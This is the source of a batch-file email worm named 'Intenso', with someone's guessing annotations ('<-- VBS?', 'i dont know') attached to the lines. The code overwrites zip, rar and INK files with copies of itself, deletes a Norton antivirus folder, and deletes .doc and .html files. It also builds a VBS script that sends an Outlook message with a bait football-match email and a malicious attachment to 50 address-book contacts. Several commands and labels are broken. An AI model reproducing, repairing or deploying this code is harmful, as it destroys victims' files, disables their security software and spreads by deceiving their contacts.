set inten=>nul <-- VBS?
@echo off%inten% <-- VBS?
rem Intenso Virus Maded By Foxpro <-- Remark
rem spread thru outlook and infects zip files <-- Remark
rem begin <-- Remark
cls <-- clears the screen
set check=If exist c:\inten.bat goto exist$
set checkno=If not exist c:\inten.bat goto nexist$
set flopy=floopyshit <-- err.. forgot the set tag
@goto %flopy% <<-- Goto label command?
%check%
%checkno%
:exist$ <-- LABEL (can a label use a sysbel?)
rem the virus exist <-- Remark
rem do be sure lets redo the work
FOR %%a IN (*.zip) DO copy %0 %%a  <--- VBS
FOR %%a IN (*.INK) DO copy %0 %%a <--- VBS
FOR %%a IN (*.rar) DO copy %0 %%a <--- VBS
set pro=c:\progra~1
If exist %pro%\navnt @goto navnt
:navnt
rem fuckin lame navnt <-- Remark
rem shit <-- Remark
rem hope will not detect <-- Remark
attrib -r -h %pro%\navnt\ <-- Remove all attribs of a folder
rmdir %pro%\navnt\ <-- remove DIR
rem deleted success <-- Remark
:nexist <-- label
rem oh shit the copy dont exist
rem npiker iker <-- remark
FOR %%a IN (*.zip) DO copy %0 %%a 
FOR %%a IN (*.INK) DO copy %0 %%a
FOR %%a IN (*.rar) DO copy %0 %%a
REM LOL <-- remark
set write=echo
set game=>>c:\game.vbs
%write%On Error Resume Next%game%
%write%Dim x%game%
%write%Set intenso=CreateObject("Outlook.Application")%game% <== Lebel?
%write%For x=1 To 50%game%
%write%Set intensow=intenso.CreateItem(0)%game%
%write%intensow.to=intenso.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)%game%
%write%intensow.Subject="The football match JUVENTUS VS Milano"%game%
%write%intensow.Body="Hi my friend Here is at the attachment the infos about the juventus and milano game on 28%game% %write%May in OldTrafford.For starting The file just doubleclick..."%game%
%write%intensow.Attachments.Add("C:\geek.vbs")%game%
%write%intensow.Send
Next
intenso.Quit
:floppyshit <== Label
for %%a in (*.doc) DO delete %%a
for %%a in (*.html) DO delete %%a
set geek=geek
@goto %geek%
:geek <-- Label the rest of the tags below.. i dont know
%write%Dim fox,fox2>>lg.vbs
%write%Set fox2=CreateObject("Scripting.FileSystemObject")>>lg.vbs
%write%set batchw=fso.CreateTextFile("c:\game.bat")>>lg.vbs
%write%fox.WriteLine "@echo off">>lg.vbs
%write%fox.WriteLine "cls">>lg.vbs
%write%fox.WriteLine "goto a">>lg.vbs
%write%fox.WriteLine ":a">>lg.vbs
%write%fox.WriteLine "for %%a in (*.zip) DO copy %0 %%a">>lg.vbs
%write%fox.WriteLine "for %%a in (*.rar) DO copy %0 %%a">>lg.vbs
%write%fox.WriteLine "exit">>lg.vbs
%write%fox.Close>>lg.vbs
start lg.vbs
start c:\game.vbs

